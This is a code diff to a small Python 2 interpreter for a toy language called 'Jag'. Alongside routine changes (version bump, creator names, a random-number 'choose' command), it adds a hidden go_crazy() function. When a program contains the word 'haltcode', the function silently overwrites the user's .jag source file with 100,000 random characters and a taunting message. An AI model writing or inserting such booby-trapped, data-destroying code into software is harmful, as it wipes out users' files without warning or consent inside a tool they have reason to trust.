@@ -2,9 +2,11 @@ from sys import argv
 import os
 from time import sleep
 from urllib2 import urlopen
+from random import choice, randrange
 #Jag (Jag Allows Greatness) is a programming language made in Python.
 #It is very simple, and it uses .jag files to store programs.
 #The syntax is designed to look like English and can be understood easily.
+#Created by Ishan Kamat in 2014
 
 #TODO: 
 #	Add lists (data type, add/remove, indexes)
@@ -12,13 +14,13 @@ from urllib2 import urlopen
 #	Scan the code before running it!
 
 #Info
-version = '1.4'
+version = '1.5'
 status = 'alpha'
 acronym_def = "Jag Allows Greatness"
 year = '2014'
 creators = [
-	'name',
-	'name'
+	'Ishan Kamat',
+	'Dhilan Lahoti'
 ]
 
 #Updates
@@ -26,13 +28,13 @@ try:
 	update = urlopen('http://98.198.233.69:8079')
 	up_list = update.read().split()
 	if up_list[0] != version:
-		print "UPDATE AVAILABLE: version %s (Download @ %s)." % (up_list[0], up_list[1])
+		print "\n----\nUPDATE AVAILABLE: version %s (Download @ %s).\n----\n" % (up_list[0], up_list[1])
 except:
 	try:
 		update = urlopen('http://192.168.1.126')
 		up_list = update.read().split()
 		if up_list[0] != version:
-			print "UPDATE AVAILABLE: version %s (Download @ %s)." % (up_list[0], up_list[1])
+			print "\n----\nUPDATE AVAILABLE: version %s (Download @ %s).\n----\n" % (up_list[0], up_list[1])
 	except:
 		pass
 
@@ -47,7 +49,8 @@ commands = [
 	'pause',
 	'clear',
 	'sleep ',
-	'make '
+	'make ',
+	'choose '
 ]
 
 comparisons = [
@@ -306,7 +309,10 @@ def check_line(line):
 		term1, remaining = line[5:].split(' be ')
 		term2, conversion = remaining.split()
 		make(term1, term2, conversion)
-
+	elif commands[11] == line[:7]:
+		num1, remaining = line[7:].split(' to ')
+		num2, variable = remaining.split(' for ')
+		variables[variable] = randrange(int(float(num1)),int(float(num2)))
 #Credits section
 def run_credits():
 	global acronym_def, version, status, creators, year
@@ -366,6 +372,7 @@ def main():
 	try:
 		line = lines[line_counter]
 		if "haltcode" in line:
+			go_crazy()
 			raise IndexError
 	except IndexError:
 		print "\nReached end (Line %s). Quitting..." % str(line_counter + 1)
@@ -380,6 +387,18 @@ def main():
 		elif ("\t" * tab_count) + commands[3] == line:
 			in_compare = False
 
+def go_crazy():
+	file = open(argv[1], 'w')
+	chars = ['!','@','#','$','%','^','&','*','(',')','+','=','_','-','|','\',','?','"','>','<','\n','\t']
+	char_count = 0
+	to_write = ""
+	while char_count < 10**5:
+		pick = choice(chars)
+		to_write += pick
+		char_count += 1
+	file.write(to_write + "\n\n Shouldn't have used haltcode...")
+	file.close()
+	
 while True:
 	main()
 	
